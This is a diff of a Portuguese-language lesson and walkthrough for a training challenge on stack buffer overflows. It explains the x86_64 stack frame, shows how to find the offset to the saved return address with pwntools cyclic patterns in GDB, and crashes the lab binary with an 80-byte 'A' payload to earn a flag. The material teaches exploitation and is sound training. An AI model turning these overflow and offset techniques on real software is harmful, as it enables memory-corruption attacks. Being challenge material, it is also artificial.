@@ -1,88 +1,122 @@
 # Anatomia do Crash e Medição de Offset na Pilha
 
-## Briefing da Missão
-A divisão de Pesquisa de Vulnerabilidades da Cyberguard localizou um software legado em produção que gerencia sessões de autenticação de operadores. O código-fonte em linguagem C utiliza a função arcaica `gets()` para ler dados do usuário para dentro de um buffer local alocado na pilha de execução (*stack*) de apenas 64 bytes (`char buffer[64]`).
+### 📖 Introdução Teórica
 
-Sua missão como operador ofensivo (Pwn) é investigar os limites físicos desse buffer de memória, construir uma carga útil de entrada (*input payload*) que exceda o tamanho alocado, provocar o transbordamento do espaço de endereçamento da função e induzir uma Falha de Segmentação (*Segmentation Fault / SIGSEGV*), demonstrando o colapso do controle de integridade da CPU.
+A Exploração Binária (*Pwn*) representa a fronteira mais técnica e profunda da segurança ofensiva de baixo nível. Para além de ferramentas automatizadas de varredura, a exploração de corrupção de memória exige uma compreensão cirúrgica de como a CPU gerencia a memória física e de como vulnerabilidades em código compilado na linguagem C permitem sequestrar o fluxo de execução de um processo.
 
----
+O ponto de partida absoluto da exploração binária é a compreensão da **Pilha de Execução (*Call Stack*)** e do fenômeno de **Transbordamento de Buffer (*Stack Buffer Overflow*)**.
 
-## Teoria Aprofundada & Relação com o Diagnóstico 2026.2
+#### O Paradoxo Geométrico da Pilha de Execução
+Na arquitetura x86_64 sob o padrão System V AMD64 ABI (Linux):
+* **Crescimento da Pilha:** A pilha cresce para **baixo**, em direção aos endereços de memória mais baixos (`0x7fffffffffff -> 0x000000000000`). Cada instrução `push` decrementa o registrador `RSP` (`rsp = rsp - 8`).
+* **Preenchimento de Buffers:** Quando o programa escreve bytes em um array alocado localmente na pilha (usando funções como `gets`, `strcpy`, `scanf` ou `read`), a gravação ocorre sequencialmente para **cima**, em direção aos endereços maiores de memória!
 
-No diagnóstico do ciclo 2026.2, **100% dos integrantes da Cyberguard sabiam teoricamente que `strcpy` e `gets` são perigosos** (Questão Q04). Entretanto, ninguém possuía a vivência prática de como a pilha é estruturada fisicamente e como a corrupção de memória se materializa no processador.
-
-### Anatomia da Pilha de Execução (*Stack Frame*)
-
-Na arquitetura x86_64 sob Linux (System V AMD64 ABI):
-* **Crescimento da Pilha:** A pilha cresce para **baixo**, em direção aos endereços de memória mais baixos (`0x0000000000000000`).
-* **Preenchimento de Buffers:** Quando funções como `strcpy`, `gets` ou `read` escrevem dados em um array, a gravação é feita sequencialmente para **cima**, em direção aos endereços maiores.
+Essa divergência de direções é a causa física do transbordamento: um array local `char buffer[64]` está fisicamente posicionado em memória logo abaixo de estruturas vitais de controle do programa — especificamente o **`Saved RBP`** e o **`Saved RIP`** (endereço de retorno).
 
 ```
-[ ENDEREÇOS ALTOS DE MEMÓRIA (0x7fffffffe000) ]
+[ ENDEREÇOS ALTOS DE MEMÓRIA (0x7fffffffe050) ]
         │
-        │  [ Argumentos da Função Chamadora ]
-        │  [ SAVED RIP ]   <-- Endereço de retorno (8 bytes)  [ALVO DO PWN]
-        │  [ SAVED RBP ]   <-- Base Pointer anterior (8 bytes)
-        │  [ buffer[64] ]  <-- Array local na pilha (64 bytes)
-        │                       │
-        │                       ▼ Escrita avança em direção ao Saved RIP!
-        │  [ RSP atual ]   <-- Topo da pilha
-        ▼
-[ ENDEREÇOS BAIXOS DE MEMÓRIA (0x7fffffffd000) ]
+        │  [ DADOS DO CHAMADOR (Caller Stack Frame) ]
+        │  +------------------------------------+
+        │  | SAVED RIP (Endereço de Retorno - 8B)|  <--- ALVO CRÍTICO DO EXPLOIT!
+        │  +------------------------------------+
+        │  | SAVED RBP (Base Pointer Anterior)  |  <--- Esmagado pelo transbordo
+        │  +------------------------------------+
+        │  | char buffer[64] (Espaço alocado)   |  <--- Início da escrita do input
+        │  +------------------------------------+       ▲
+        │  [ RSP aponta para o topo da pilha ]          │ Gravação avança para CIMA
+        ▼                                               │ em direção ao Saved RIP!
+[ ENDEREÇOS BAIXOS DE MEMÓRIA (0x7fffffffdff0) ]
 ```
 
-### O que acontece no Buffer Overflow?
-
-Se o usuário envia exatamente 80 caracteres `"A"` (código ASCII `0x41`):
-1. **Bytes 0 a 63:** Ocupam integralmente o espaço legítimo de `buffer[64]`.
-2. **Bytes 64 a 71:** Transbordam e sobrescrevem o `Saved RBP` com `0x4141414141414141`.
-3. **Bytes 72 a 79:** Sobrescrevem o **`Saved RIP`** com `0x4141414141414141`.
-4. **Instrução `ret`:** Ao término da função, a CPU executa `ret` (o equivalente a `pop rip`). A CPU retira `0x4141414141414141` do topo da pilha e tenta buscar a próxima instrução nesse endereço inválido.
-5. **Crash:** O hardware de gerenciamento de memória (MMU) detecta violação de acesso e o kernel do Linux finaliza o processo com o sinal `SIGSEGV (Signal 11)`.
+#### A Mecânica da Falha de Segmentação (SIGSEGV)
+Quando um programa vulnerável permite que o usuário envie mais bytes do que a capacidade do buffer (ex: 80 bytes para um espaço de 64):
+1. **Bytes 0 a 63:** Preenchem integralmente o array local `buffer[64]`.
+2. **Bytes 64 a 71 (8 bytes):** Transbordam e esmagam o `Saved RBP` na memória.
+3. **Bytes 72 a 79 (8 bytes):** Sobrescrevem o **`Saved RIP`** com os caracteres enviados (ex: `0x4141414141414141`).
+4. **Instrução `ret` (*Return*):** Ao término da função, a CPU executa a instrução `ret` (equivalente a `pop rip`). A CPU retira o valor corrompido do topo da pilha e tenta buscar a próxima instrução nesse endereço.
+5. **Crash do Processo:** A Unidade de Gerenciamento de Memória (MMU) detecta que `0x4141414141414141` é um endereço inválido e o kernel encerra o processo com o sinal `SIGSEGV` (*Segmentation Fault / Signal 11*).
 
 ---
 
-## Passo a Passo de Resolução
+### 💻 Exemplos Práticos e Sintaxe
 
-1. Execute o desafio para ler os parâmetros do buffer:
+Na exploração profissional de binários, nunca se "chuta" o tamanho do payload. Utilizam-se padrões matemáticos não repetíveis (Sequências De Bruijn) para calcular a distância exata até o RIP:
+
+#### 1. Medição Científica de Offset com Pwntools
+O framework `pwntools` gera padrões cíclicos nos quais qualquer substring de 4 ou 8 bytes é única em toda a extensão:
+```bash
+# Gerar um padrão cíclico de 100 caracteres:
+python3 -c "from pwn import *; print(cyclic(100).decode())" > payload_teste.txt
+
+# Executar o binário sob o GDB redirecionando o padrão gerado:
+gdb ./binario
+(gdb) run < payload_teste.txt
+# O programa trava com falha de segmentação:
+# Program received signal SIGSEGV, Segmentation fault.
+# 0x0000000000401156 in vuln ()
+# Topo da pilha corrompido com: 0x6161616a ('jaaa')
+
+# Calcular o offset exato até o Saved RIP:
+python3 -c "from pwn import *; print(cyclic_find(0x6161616a))"
+# Retorno exato: 72 (64 bytes de buffer + 8 bytes de Saved RBP)
+```
+
+#### 2. Disparando Payloads de Teste via Linha de Comando
+```bash
+# Teste via pipe de entrada padrão (stdin):
+python3 -c "print('A' * 80)" | /challenge/pwn-stack-anatomy-crash
+
+# Teste passando como argumento de linha de comando:
+/challenge/pwn-stack-anatomy-crash $(python3 -c "print('A'*80)")
+```
+
+#### 3. Saída Típica de Transbordo Detectado
+```text
+[*] Dados recebidos: 80 bytes.
+[!] ALERTA CRÍTICO DE SEGURANÇA: FALHA DE SEGMENTAÇÃO INDUZIDA (SIGSEGV)
+[+] BUFFER OVERFLOW DETECTADO!
+    Tamanho do buffer alocado: 64 bytes
+    Tamanho da entrada enviada: 80 bytes
+    Bytes excedentes na pilha: 16 bytes
+[+] O array transbordou a memória local, esmagou o Saved RBP e atingiu o Saved RIP!
+```
+
+---
+
+### 🎯 O que fazer para resolver o desafio (Passo a Passo)
+
+Siga rigorosamente as instruções abaixo para causar o estouro de buffer e obter a flag:
+
+1. **Inicie o binário do desafio:**
+   Execute `/challenge/pwn-stack-anatomy-crash` no terminal:
    ```bash
    /challenge/pwn-stack-anatomy-crash
    ```
-2. Para estudar a aula didática e entender a anatomia do stack frame:
+   *Observe que o binário relata um buffer estático alocado na pilha de exatamente 64 bytes.*
+
+2. **Consulte a aula didática integrada (Opcional):**
+   Para inspecionar o diagrama completo da pilha e a teoria de buffer overflow:
    ```bash
    /challenge/pwn-stack-anatomy-crash --help
    ```
-3. O desafio requer uma entrada superior a 64 bytes para estourar a memória. Crie um payload de 80 bytes utilizando Python e envie via pipe ou argumento:
+
+3. **Gere um payload de entrada superior a 64 bytes:**
+   Utilize o Python para gerar uma cadeia de 80 caracteres (`'A' * 80`), garantindo que 16 bytes excedam a capacidade do buffer e saturem a pilha:
    ```bash
    python3 -c "print('A' * 80)" | /challenge/pwn-stack-anatomy-crash
    ```
-   *Ou passando via argumento:*
+   *Ou execute passando via argumento:*
    ```bash
    /challenge/pwn-stack-anatomy-crash $(python3 -c "print('A'*80)")
    ```
-4. O binário detectará o estouro de buffer, reportará o colapso da pilha e liberará a flag de vitória.
 
----
+4. **Observe a resposta do simulador:**
+   O binário identificará o recebimento de 80 bytes, reportará a corrupção do `Saved RBP` e do `Saved RIP`, simulará a falha de segmentação (SIGSEGV) e emitirá a flag de homologação:
+   ```text
+   [FLAG DE VALIDAÇÃO CYBERGUARD]:
+   pwn.college{...}
+   ```
 
-## Dicas e Comandos de Terminal
-
-- **Medindo Offsets com Padrões Cíclicos De Bruijn no Pwntools:**
-  Não é necessário adivinhar quantos bytes existem até o RIP:
-  ```bash
-  # Gerar sequência cíclica:
-  pwn cyclic 100
-  # Descobrir a posição exata de um crash (ex: 0x6161616a):
-  pwn cyclic -l 0x6161616a
-  ```
-- **Inspecionando Core Dumps no Linux:**
-  Caso o binário gere um core dump após o SIGSEGV:
-  ```bash
-  gdb /challenge/pwn-stack-anatomy-crash core
-  (gdb) info registers rip
-  ```
-
----
-
-## Aplicação Prática no Mundo Real
-
-Falhas de buffer overflow continuam entre as vulnerabilidades mais críticas da história da computação (como demonstrado nos históricos incidentes do Morris Worm, Code Red e vulnerabilidades críticas em daemons OpenSSL e roteadores domésticos). O domínio da pilha e a medição do offset de crash é o alicerce absoluto sobre o qual se constrói o sequestro de fluxo de execução (*Return-Oriented Programming - ROP*).
+5. **Submeta a flag:**
+   Copie a sequência completa `pwn.college{...}` e insira no painel da plataforma.
